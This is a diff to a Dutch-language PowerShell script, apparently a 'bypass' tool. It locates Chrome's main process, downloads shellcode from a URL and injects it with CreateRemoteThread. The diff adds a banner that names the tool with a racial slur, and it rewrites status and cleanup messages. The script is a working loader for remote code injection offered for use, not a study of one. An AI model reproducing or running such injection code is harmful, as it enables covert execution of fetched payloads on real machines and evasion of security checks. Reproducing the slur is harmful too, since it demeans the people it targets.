@@ -5,7 +5,17 @@ if (-not [Environment]::Is64BitProcess) {
     exit
 }
 
-Write-Host "---GEMAAKT DOOR MJBP <3---" -ForegroundColor Cyan
+Clear-Host
+Write-Host ""
+Write-Host "  ----------------------------------------" -ForegroundColor Cyan
+Write-Host "  I                                      I" -ForegroundColor Cyan
+Write-Host "  I       NIGGER BYPASS  v6.7            I" -ForegroundColor Cyan
+Write-Host "  I       Gemaakt door: MJBP <3          I" -ForegroundColor Cyan
+Write-Host "  I                                      I" -ForegroundColor Cyan
+Write-Host "  ----------------------------------------" -ForegroundColor Cyan
+Write-Host ""
+Write-Host ""
+Write-Host ""
 Write-Host "[+] Zoeken naar Chrome processen..." -ForegroundColor Cyan
 
 $edgeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
@@ -34,17 +44,18 @@ $targetPID = $targetProcess.Id
 $memoryMB = [math]::Round($targetProcess.WorkingSet64 / 1MB, 1)
 
 Write-Host "[+] Hoofdvenster gekozen!" -ForegroundColor Green
-Write-Host "[+] PID: $targetPID  |  Geheugen: $memoryMB MB (Hoofdvenster)" -ForegroundColor Green
-Write-Host ""
+Write-Host "[+] PID: $targetPID." -ForegroundColor Green
 
 try {
     $shellcode = (New-Object Net.WebClient).DownloadData($url)
-    Write-Host "[+] Download gelukt" -ForegroundColor Green
+    Write-Host "[+] Download gelukt." -ForegroundColor Green
 } catch {
     Write-Host "[-] Download mislukt: $($_.Exception.Message)" -ForegroundColor Red
     pause
     exit
 }
+
+Write-Host "--------------------------------------------------------------------------------"
 
 $size = $shellcode.Length
 
@@ -81,8 +92,11 @@ try {
     $hThread = [Native.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$null)
     if ($hThread -eq [IntPtr]::Zero) { throw "CreateRemoteThread mislukt" }
 
-    Write-Host "[+] Injectie succesvol in Hoofdvenster (PID $targetPID)!" -ForegroundColor Green
-    Write-Host "[+] LAAT DIT CHROME VENSTER OPEN STAAN!" -ForegroundColor Red
+    Write-Host "--------------------------------------------------------------------------------"
+    Write-Host "[+] Injectie succesvol - Je kan nu deze CMD afsluiten." -ForegroundColor Green
+    Write-Host "[-] Om te cleanen druk je op END of sluit je chrome af." -ForegroundColor Yellow
+    Write-Host "[!] LAAT JE CHROME OPEN STAAN!" -ForegroundColor Red
+
 } catch {
     Write-Host "[-] Injectie mislukt: $($_.Exception.Message)" -ForegroundColor Red
 } finally {
